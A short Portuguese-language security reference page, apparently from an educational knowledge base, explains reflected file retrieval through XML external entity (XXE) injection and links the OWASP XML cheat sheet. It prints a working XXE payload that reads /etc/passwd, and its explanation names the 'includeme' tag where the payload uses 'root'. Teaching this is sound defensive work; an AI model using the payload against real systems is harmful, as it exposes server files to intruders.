---
title: Recuperação de arquivo refletida
---

Considere o seguinte código de exemplo de um XXE:

```xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>

```

O XML anterior define uma entidade chamada xxe, que é na verdade o conteúdo de `/etc/passwd`, que será expandido dentro da `includeme` tag. Se o analisador permitir referências a entidades externas, ele pode incluir o conteúdo desse arquivo na resposta XML ou na saída de erro.

## Referência externa

- [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html)